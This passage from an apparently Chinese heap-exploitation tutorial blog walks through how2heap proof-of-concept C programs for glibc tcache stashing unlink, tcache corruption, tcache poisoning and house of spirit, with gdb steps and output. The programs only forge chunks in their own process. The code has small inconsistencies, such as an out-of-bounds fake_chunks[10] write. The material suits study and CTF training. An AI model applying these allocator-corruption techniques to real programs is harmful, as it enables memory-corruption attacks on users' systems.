class="line">它包含指向链表中下一个chunk的指针，这就是为什么堆指针会被写入栈。</span><br><span class="line"></span><br><span class="line">先前提到如果栈上值为零，释放少于6次也可以工作，</span><br><span class="line">因为栈上的值会被视为链表next指针，若非有效指针或null会导致崩溃。</span><br><span class="line"></span><br><span class="line">现在栈数组的内容如下：</span><br><span class="line"></span><br><span class="line">0x7ffff3b70d10: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7ffff3b70d18: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7ffff3b70d20: 0x56131b5de4d0</span><br><span class="line">0x7ffff3b70d28: 0x56131b5de010</span><br><span class="line">0x7ffff3b70d30: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7ffff3b70d38: 0xcdcdcdcdcdcdcdcd</span><br><span class="line"></span><br><span class="line">最后，再次调用malloc会得到栈地址：0x7ffff3b70d20</span><br></pre></td></tr></table></figure>

<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>我们知道当同一个size的chunk在tcachebins中满7个时，就会填入fasbins，而当tcachebins中的chunk被申请完了，系统会将fastbins中同样size逆序放入到tcachebins</p>
<p>首先，创建了14个chunk填满了tcache_bins，fastbins</p>
<p>然后，通过 UAF 或 堆溢出 修改fastbins中第一个放入的chunk(victim)的fd指针指向栈地址(实战中可以为任意可写地址，比如got表可写的__free_hook-0x10)</p>
<p>最后，申请出7个tcachebins，再申请一个即可触发 fastbin_reverse_into_tcache，然后第一个放入fastbins的chunk(victim)就会出现在tcachebins的头部，申请出即可</p>
<h3 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h3><p>攻击成效：向任意地址写堆地址或分配任意地址</p>
<p>攻击前提：</p>
<ul>
<li>能够控制 Small Bin chunk的bk指针</li>
<li>程序可以越过Tache取chunk。（calloc可以做到）</li>
<li>程序可以分配两种不同大小且属于Unsorted Bin的chunk</li>
</ul>
<p>参考链接：<a href="https://blog.csdn.net/qq_41252520/article/details/126198171">https://blog.csdn.net/qq_41252520/article/details/126198171</a></p>
<p>how2heap ;2.31</p>
<p>主要利用的是small bin链表中摘堆块后重新排列进tcache的原理</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;本文件演示针对tcache的stashing unlink攻击。\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;该PoC已在glibc-2.27、glibc-2.29和glibc-2.31测试通过。\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;当你能覆盖victim-&gt;bk指针时可以使用此技术。此外，需要至少使用calloc分配一次内存。最后，我们需要一个可写地址来绕过glibc的检查。\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;glibc将smallbin放入tcache的机制为我们提供了攻击机会。\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;此技术允许我们向任意地址写入libc地址，并在需要处创建伪造chunk。本例将在栈上创建伪造chunk。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var模拟我们要分配到的伪造chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_var模拟我们想要分配到的伪造chunk。\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;首先向fake_chunk-&gt;bk写入可写地址以绕过glibc中的bck-&gt;fd = bin检查。这里选择stack_var[2]的地址作为伪造bk。稍后可以看到*(fake_chunk-&gt;bk + 0x10)即stack_var[4]将在攻击后变为libc地址。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;可以看到fake_chunk-&gt;bk的值为：%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;同时查看stack_var[4]的初始值：%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在分配9个malloc chunk。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配9个chunk</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将7个chunk放入tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;随后释放其中7个chunk到tcache。注意没有连续释放chunk2到chunk9，因为相邻的unsorted bin会在后续malloc时合并。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;可以看到，chunk1及[chunk3,chunk8]被放入tcache，而chunk0和chunk2将进入unsorted bin。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最后一个tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">// 现在放入unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转换为small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在分配大于0x90的chunk使chunk0和chunk2进入small bin。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>); <span class="comment">// 大小 &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在有5个tcache bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;接着分配两个chunk腾出空间，现在有5个tcache bin和2个small bin。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在模拟可以覆盖victim-&gt;bk指针指向伪造chunk地址的漏洞：%p。\n\n&quot;</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改victim-&gt;bk</span></span><br><span class="line">    <span class="comment">/* 漏洞点 */</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/* 漏洞点 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 触发攻击</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;最后用calloc分配0x90的chunk触发攻击。之前释放的small bin将被返回，另一个chunk和伪造chunk被链接到tcache。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在伪造chunk已被放入tcache bin[0xa0]链表。其fd指针指向下一个空闲chunk：%p，且bck-&gt;fd已被修改为libc地址：%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配并获取栈上的伪造chunk</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;可以看到，下一次malloc(0x90)将返回我们伪造的chunk区域：%p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><ol>
<li>申请 9 个 chunk，然后先释放chunk3 - chunk8 和chunk1，他们会被放入 tcache bin中。然后再释放 chunk0 和 chunk2，会被放入 unsortedbin中（连着释放7个会被合并）；</li>
<li>随后申请一个 大于 上述 chunk size (0x90)的chunk，那么此时所有 的 空闲chunk都不合适，并且 unsortedbin 中的chunk0 和 chunk2 会被放入 small bin中；</li>
<li>申请两个 tcache，此时 tcache 中的 剩余 chunk数量 为 5 个；</li>
<li><strong>修改 chunk 2 的 bk指针 指向我们伪造的 内存的地址 chunk，<u>该内存地址的chunk 的 bk 指针要为一个 可写入的地址</u>；</strong></li>
<li>随后调用 calloc() 申请 与tcache 同大小的 chunk，由于 calloc() 函数会跳过 tcache，所以其会直接从 small bin中 取 chunk0；</li>
<li>此时，同上述的 fastbin_reverse_into_tcache 类似的结果，small bin 中剩余的 chunk2-&gt; fake chunk，会从后向前 加入 tcache中，而且由于此时tcache 仅剩2个空余，所以只会遍历到 fake chunk就会结束。</li>
<li>经过上述操作后，此时 tcache链中 第一个 chunk 是 fake chunk，我们取出即可。</li>
</ol>
<h3 id="tcache-corruption"><a href="#tcache-corruption" class="headerlink" title="tcache_corruption"></a>tcache_corruption</h3><p>这段代码演示了控制tcache_perthread_struct的chunk，修改next指针（目前的tcache并没有检查next指向的chunk的size是否合法，所以直接伪造next指针为想要修改的地址就好了）实现任意地址写</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TCACHE_MAX_BINS 64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">    tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> global_buf[<span class="number">0x100</span>] = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *ptr, *controlled_buf;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> temp;</span><br><span class="line">    tcache_perthread_struct *fake;</span><br><span class="line"><span class="comment">//申请一个 chunk 为泄露 tcache_perthread_struct 的 chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;global_buf: %s\n&quot;</span>, global_buf);</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x68</span>);</span><br><span class="line">    temp = (<span class="type">long</span> <span class="type">long</span>)ptr;</span><br><span class="line"><span class="comment">//计算出 tcache_perthread_struct 的 chunk_mem_ptr, 首先要能泄露一个堆地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;temp: %llx\n&quot;</span>, temp);</span><br><span class="line">    temp = temp &amp; (~<span class="number">0xfff</span>);</span><br><span class="line">    temp += <span class="number">0x10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;temp: %llx\n&quot;</span>, temp);</span><br><span class="line"><span class="comment">//向 tcache_perthread_struct 的 chunk 中写入一个地址，他就会出现在 tcache 中，将其申请出来就得到了一个可写的chunk</span></span><br><span class="line">    fake = (tcache_perthread_struct *)temp;</span><br><span class="line">    fake-&gt;entries[<span class="number">5</span>] = (tcache_entry *)global_buf;</span><br><span class="line"><span class="comment">//申请出那块可写的 chunk(内存)，进行写入</span></span><br><span class="line">    controlled_buf = <span class="built_in">malloc</span>(<span class="number">0x68</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(controlled_buf, <span class="string">&quot;Tcache Corruption&quot;</span>, <span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;global_buf: %s\n&quot;</span>, global_buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gdb调试：</p>
<ul>
<li><code>b 25</code>，查看 ptr </li>
<li><code>b 30</code>，查看temp，它是 tcache_perthread_struct 的 chunk_mem_ptr</li>
<li><code>b 33</code>，在这行代码处查看 global_buf 的内容，此时为 hello world</li>
<li><code>b 37</code>，再次查看 global_buf 的内容</li>
</ul>
<p>运行结果：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ctf@1a3f037ee8c1:~/pwn$ ./demo</span><br><span class="line">global_buf: hello world</span><br><span class="line">temp: 555555602670</span><br><span class="line">temp: 555555602010</span><br><span class="line">global_buf: Tcache Corruption</span><br></pre></td></tr></table></figure>

<h4 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h4><h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h3><p>来源：how2heap</p>
<p>此demo的效果就是返回一个指向任意地址的指针，与fastbin corruption攻击极其相似（本例返回的地址是一个栈地址）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">size_t</span> stack_var;</span><br><span class="line">    <span class="comment">//我们想要返回的地址是stack_var</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;定义了一个变量 stack_var，我们想让程序 malloc 到这里 %p.\n&quot;</span>, (<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;接下来申请两个 chunk\n&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk a 在: %p\n&quot;</span>, a);</span><br><span class="line">    <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk b 在: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;free 掉这两个 chunk\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在 tcache 那个链表是这样的 [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">    <span class="comment">//我们通过覆写第一个chunk的fd指针，使其指向我们的栈地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;我们把 %p 的前 %lu 字节（也就是 fd/next 指针）改成 stack_var 的地址：%p&quot;</span>, b, <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>), &amp;stack_var);</span><br><span class="line">    b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)&amp;stack_var;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在 tcache 链表是这样的 [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;然后一次 malloc : %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在 tcache 链表是这样的 [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;第二次 malloc: %p\n&quot;</span>, c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ojbk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>b 17</code>，此时申请了两个chunk，一个应该是为了防止合并到Top_chunk，另一个是要攻击的chunk，也就是b。</li>
<li><code>b 22</code>，此时两个chunk已经进入到tcache中。</li>
<li><code>b 27</code>，这里修改了b[0]的位置，也就是chunk b的next指针，此时bins中应为：<code>b -&gt; &amp;stack_var</code></li>
<li><code>b 30</code>，这里申请了一个chunk，此时bins中应为：<code>&amp;stack_var</code></li>
<li><code>b 33</code>，这里很明显就是申请出了&amp;stack_var作为chunk</li>
</ul>
<blockquote>
<p>原因：在glibc 2.27中没有像fastbin中那样检查free_chunk的size域</p>
</blockquote>
<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>对于tcache poisoning来说，我们的利用极其简单</p>
<p>只需要free掉一个chunk放入tcache中，然后直接更改其fd指针，我们就可以任意地址malloc了</p>
<p>程序首先在栈上声明了一个变量，之后malloc了chunk a(size&#x3D;128),此时free掉chunk a,a被链入到free list中</p>
<p>然后程序覆写了a的fd指针，将其指向了我们的栈指针</p>
<p>现在栈指针也被链入了我们的free list中</p>
<p>此时我们再malloc，因为不会检查size是否合法，就可以直接将我们的栈指针取出来了(先进后出</p>
<h3 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h3><p>tcache_house_of_spirit就是通过free一个Fake chunk来让malloc返回一个指向几乎任意地址的指针</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fake_chunks[1] 在 %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fake_chunks[1] 改成 0x40 \n&quot;</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;把 fake_chunks[2] 的地址赋给 a, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;free 掉 a\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;再去 malloc(0x30)，在可以看到申请来的结果在: %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ojbk\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要点：</p>
<ul>
<li>观察fake_chunks[]数组变化</li>
<li>free(a)，<code>a = &amp;fake_chunks[2];</code>原因：tcache中存放的是chunk_mem_ptr，fake_chunks[0]是prev_size域，fake_chunk[1]是size域</li>
<li>在free(a)后的bins：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x40 [  1]: 0x7fffffffe390 ◂— 0x0</span><br><span class="line">fastbins</span><br></pre></td></tr></table></figure>

<h4 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h4><p>本例就是通过free一个fake chunk来让我们malloc任意地址</p>
<p>程序首先让堆初始化了，然后申请了变量a和fake_chunks</p>
<p>之后程序在fake_chunks中伪造了一个size为0x40的fake_chunk，把a指向fake_chunk的域（也就是Fd指针</p>
<p>现在free a，我们的fake_chunk就被放到了free list中</p>
<p>此时再malloc就可以返回我们的fake chunk了</p>
<h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h3><p>在看完tcache的HOS之后,我们回来看看之前的HOS是什么样的</p>
<p>我们的house of spirit是通过free一个伪造的fastbin chunk来任意地址malloc</p>
<p>让我们来看看和tcache有什么区别吧</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;这个例子演示了 house of spirit 攻击\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;我们将构造一个 fake chunk 然后释放掉它，这样再次申请的时候就会申请到它\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;覆盖一个指向 fastbin 的指针\n&quot;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a, *b;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line">	<span class="comment">//这个域包含了两个chunk,第一个从fake_chunks[1]开始,另一个从fake_chunks[9]开始</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;这块区域 (长度为: %lu) 包含两个 chunk. 第一个在 %p 第二个在 %p.\n&quot;</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line">	<span class="comment">//这个chunk的size必须符和fastbin的要求(&lt;=128 x64位系统),PREV_INUSE位在fasybin-sized chunks中也是被忽略的,但是IS_MAPPED和NON_MAIN_AREN会引发一些问题</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;构造 fake chunk 的 size，要比 chunk 大 0x10（因为 chunk 头），同时还要保证属于 fastbin，对于 fastbin 来说 prev_inuse 不会改变，但是其他两个位需要注意都要位 0\n&quot;</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// size</span></span><br><span class="line">	<span class="comment">//下一个fake chunk的size必须是合法的。 即&gt; 2 * SIZE_SZ（在x64上需要&gt; 16）和＆&lt;av-&gt; system_mem（对于main arena来说，默认为&lt;128kb）并且可以通过nextsize完整性检查。 但是我们无需符和Fastbin的大小</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;next chunk 的大小也要注意，要大于 0x10 小于 av-&gt;system_mem（128kb）\n&quot;</span>);</span><br><span class="line">        <span class="comment">// 这是fake_chunks[?]可以数一下</span></span><br><span class="line">    fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line">    fake_chunks[<span class="number">2</span>] = <span class="number">0x4141414141414141L</span>L;</span><br><span class="line">    fake_chunks[<span class="number">10</span>] = <span class="number">0x4141414141414141L</span>L;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;现在，我们拿伪造的那个 fake chunk 的地址进行 free, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;free!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">	<span class="comment">//现在下一次的malloc就将会返回我们的fake chunk了</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;现在 malloc 的时候将会把 %p 给返回回来\n&quot;</span>, &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line">    b[<span class="number">0</span>] = <span class="number">0x4242424242424242L</span>L;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ok!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看完源代码可以发现,我们正常的hos是需要伪造两个chunk的,而tcache则不需要伪造下一个chunk,但是虽然本例中需要伪造两个chunk,但是我们所伪造的第二个chunk是可以不用为fastbin大小的chunk的</p>
<h4 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h4><p>对于没有tcache的glibc版本而言，我们需要连续伪造两块size合法的chunk，并且第二块chunk的size并不需要满足fastbin的要求，只要满足合法的size即可</p>
<p>本程序首先初始话了一下堆,然后申请了两个变量，一个是我们即将攻击的变量 a，另一个是我们的fake_chunks</p>
<p>程序先在fake_chunks[1]的地方也就是size域伪造了合法的size，0x40(满足fastbin size大小，与16字节对齐，标志位正确)</p>
<p>之后又在下一处伪造了第二个chunk，即从fake_chunks[8]开始的地方，这是为什么呢，因为我们第一个fake chunk的size伪造成了0x40，那么我们第二个chunk就需要在向下0x40的地方也就是fake_chunks+8的地方伪造第二个chunk</p>
<h3 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house_of_botcake"></a>house_of_botcake</h3><p>本攻击可以bypass glibc 新增加的一些限制,如果libc没有该限制,我们可以直接用double free来做更简单的tcache poisoning了</p>
